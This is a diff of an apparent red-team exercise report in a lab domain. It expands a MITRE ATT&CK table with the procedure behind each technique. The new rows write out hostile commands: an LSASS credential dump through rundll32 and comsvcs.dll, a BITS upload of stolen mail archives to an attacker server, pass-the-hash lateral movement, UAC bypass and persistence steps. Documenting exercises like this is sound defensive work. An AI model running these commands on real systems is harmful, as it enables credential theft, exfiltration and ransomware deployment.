@@ -212,7 +212,6 @@ Once on the Domain Controller, the attacker established persistence via DLL Sear
 
 **Figure 12:** DLL Search Order Hijacking persistence on DC  
 
-<img width="729" height="120" alt="ksnip_20260302-212552" src="https://github.com/user-attachments/assets/3aad2b63-c805-468e-bbaf-eff48bee89eb" />
 <img width="822" height="86" alt="ksnip_20260303-001846(2)" src="https://github.com/user-attachments/assets/b0617801-52b6-42b7-8715-dd0bfa6e377e" />
 
 
@@ -254,38 +253,42 @@ The `run.bat` launcher executed the destructive payload **filelessly, entirely i
 
 ## 5. Consolidated MITRE ATT&CK Mapping Table
 
-| Tactic | Technique | ID | Description |
-|--------|-----------|----|-------------|
-| Reconnaissance | Gather Victim Org Information | T1590 | Target selection based on military chain and arms trafficking narrative |
-| Reconnaissance | Impersonation | T1672 | Email spoofing of European Border and Coast Guard Agency |
-| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Malicious `.doc` attachment exploiting CVE‑2017‑0199 |
-| Execution | Exploitation for Client Execution | T1203 | RTF parser exploit in Microsoft Office |
-| Execution | Signed Binary Proxy Execution: Mshta | T1218.005 | `mshta.exe` invoked to execute remote HTA |
-| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | IEX download cradle for in‑memory Grunt |
-| Persistence | Event Triggered Execution: COM Hijacking | T1546.015 | Registry hijack of CLSID `D9144DCD‑E998‑4ECA‑AB6A‑DCD83CCBA16D` |
-| Persistence | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 | Persistence on Domain Controller via DLL hijacking |
-| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | Scheduled task deployed via GPO abuse, used as trigger for coordinated domain‑wide payload deployment |
-| Privilege Escalation | Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 | `slui.exe` + `DelegateExecute` registry key |
-| Defense Evasion | Obfuscated Files or Information | T1027 | Base64/UTF‑16LE encoding of PowerShell stager |
-| Defense Evasion | Obfuscated Files or Information: Steganography | T1027.003 | LSB steganography hiding `encrypt4.bat` inside `SplashScreen.png` |
-| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | `comsvcs.dll` MiniDump via `rundll32.exe` |
-| Credential Access | Adversary‑in‑the‑Middle | T1557.001 | Attempted Inveigh LLMNR/NBNS spoofing – blocked by AMSI |
-| Discovery | System Owner/User Discovery | T1033 | `whoami` |
-| Discovery | System Information Discovery | T1082 | `systeminfo`, software enumeration |
-| Discovery | System Network Configuration Discovery | T1016 | `ipconfig /all` |
-| Discovery | File and Directory Discovery | T1083 | Search for `.pst`/`.ost` files |
-| Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 | Impacket `psexec.py` with NTLM hash |
-| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | WinRM |
-| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | PsExec to Domain Controller |
-| Collection | Email Collection: Local Email Collection | T1114.001 | Collection of `.pst`/`.ost` files |
-| Collection | Archive Collected Data | T1560 | `Compress-Archive` into `outlook_exfil.zip` |
-| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Covenant Grunt over HTTP |
-| Exfiltration | Exfiltration Over Alternative Protocol | T1048 | BITS transfer with `-Priority Low` to attacker HTTP server |
-| Impact | Domain Policy Modification: Group Policy Modification | T1484.001 | GPO abuse to distribute payload domain‑wide |
-| Impact | Lateral Tool Transfer | T1570 | SYSVOL distribution of payload and scripts |
-| Impact | Disk Content Wipe | T1561.001 | Payload zeroed disk files as first destructive stage |
-| Impact | Data Encrypted for Impact | T1486 | Payload encrypted the same files after wipe |
-| Impact | Disk Wipe | T1561 | Potential disk wipe capability via same GPO/scheduled task mechanism |
+> **Status key:** ✅ Executed | ⚠️ Attempted / Blocked or Failed | 📋 Planned / Not Demonstrated
+
+| Tactic | Technique Name | ID | Status | Procedure |
+|--------|---------------|----|--------|-----------|
+| Reconnaissance | Gather Victim Org Information | T1590 | ✅ Executed | Target selection based on military chain and arms trafficking narrative |
+| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | ✅ Executed | Malicious `.doc` attachment (`OperInformativ_163.doc`) exploiting CVE‑2017‑0199 |
+| Execution | Exploitation for Client Execution | T1203 | ✅ Executed | RTF parser exploit in Microsoft Office triggering remote payload |
+| Execution | Signed Binary Proxy Execution: Mshta | T1218.005 | ✅ Executed | `mshta.exe` invoked to execute remote HTA file |
+| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | ✅ Executed | IEX download cradle delivering in‑memory Grunt stager |
+| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | ✅ Executed | `PersistAutorun` via `CurrentUser` hive — key name `Updater`, value `C:\Example\GruntStager.exe` |
+| Persistence | Event Triggered Execution: COM Hijacking | T1546.015 | ✅ Executed | Registry hijack of CLSID `D9144DCD‑E998‑4ECA‑AB6A‑DCD83CCBA16D` via Covenant `PersistCOMHijack` |
+| Persistence | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 | ✅ Executed | Persistence established on Domain Controller by dropping malicious DLL into a hijackable search path |
+| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | ✅ Executed | Scheduled task deployed domain‑wide via GPO abuse, acting as trigger for final payload |
+| Privilege Escalation | Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 | ✅ Executed | `slui.exe` launched with `DelegateExecute` registry key; escalated from Medium to HIGH integrity |
+| Defense Evasion | Obfuscated Files or Information | T1027 | ✅ Executed | PowerShell stager encoded in Base64 / UTF‑16LE to evade string‑based detection |
+| Defense Evasion | Obfuscated Files or Information: Steganography | T1027.003 | ✅ Executed | LSB steganography used to hide `encrypt4.bat` inside `SplashScreen.png` |
+| Defense Evasion | Email Spoofing | T1672 | ✅ Executed | Spoofed sender domain impersonating European Border and Coast Guard Agency to bypass recipient trust checks |
+| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | ✅ Executed | `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 552 C:\Windows\Temp\lsass.dmp full` |
+| Credential Access | Adversary‑in‑the‑Middle: LLMNR/NBT‑NS Poisoning and SMB Relay | T1557.001 | ⚠️ Attempted / Blocked by AMSI | Inveigh launched in‑memory via PowerShell IEX; AMSI intercepted before any hashes captured; pivoted to LSASS dump |
+| Discovery | System Owner/User Discovery | T1033 | ✅ Executed | `whoami` — confirmed `cyber` context, later `nt authority\system` post‑escalation |
+| Discovery | System Information Discovery | T1082 | ✅ Executed | Registry enumeration of installed software (`HKLM:\Software\...\Uninstall\*`) |
+| Discovery | System Network Configuration Discovery | T1016 | ✅ Executed | `ipconfig /all` — identified DNS server `192.168.1.200`, domain suffix `mad.local` |
+| Discovery | File and Directory Discovery | T1083 | ✅ Executed | `Get-ChildItem -Path C:\Users\ -Include *.pst,*.ost,*.msg -Recurse` |
+| Discovery | Security Software Discovery | T1518.001 | ✅ Executed | `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct` — confirmed Windows Defender; Wazuh Agent identified via software enumeration |
+| Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 | ✅ Executed | Impacket `psexec.py` with `madAdmin` NTLM hash against `192.168.1.200` (ADMIN$) |
+| Lateral Movement | Remote Services: SMB / Windows Admin Shares | T1021.002 | ✅ Executed | PsExec remote shell to Domain Controller via ADMIN$ share; confirmed `nt authority\system` |
+| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | 📋 Planned | `evil-winrm` identified as alternative path; not demonstrated in this exercise |
+| Collection | Email Collection: Local Email Collection | T1114.001 | ✅ Executed | Located and staged `archive_2025.pst` (50 MB) and `contas_pessoais.ost` (25 MB) from `C:\Users\cyber\Desktop\Backup_Outlook_2026` |
+| Collection | Archive Collected Data: Archive via Utility | T1560.001 | ✅ Executed | `Compress-Archive` used to package staged files into `C:\Windows\Tasks\outlook_exfil.zip` |
+| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | ✅ Executed | Covenant Grunt communicating over HTTP (`http://192.168.1.7:8080`) using GruntHTTP template |
+| Exfiltration | Exfiltration Over C2 Channel | T1041 | ✅ Executed | `outlook_exfil.zip` downloaded to attacker machine via Covenant's built‑in `Download` command |
+| Exfiltration | Exfiltration Over Alternative Protocol | T1048 | ⚠️ Attempted / Failed | `Start-BitsTransfer -Priority Low` to `http://192.168.1.7:80` — BITS returned "no active network connections"; Covenant download used as fallback (T1041) |
+| Impact | Domain Policy Modification: Group Policy Modification | T1484.001 | ✅ Executed | GPO modified to execute `run.bat` domain‑wide via scheduled task, achieving coordinated payload deployment |
+| Impact | Lateral Tool Transfer | T1570 | ✅ Executed | `SplashScreen.png` (steganographic carrier) and `run.bat` (decoder/launcher) uploaded to `\\mad.local\SYSVOL\mad.local\scripts\` |
+| Impact | Disk Content Wipe | T1561.001 | ✅ Executed | Payload zeroed files in target dummy directory prior to encryption (simulated; scoped to single directory) |
+| Impact | Data Encrypted for Impact | T1486 | ✅ Executed | Ransomware payload encrypted the same files immediately after wipe; "notPetya from Temu" note displayed |
 
 ---
 
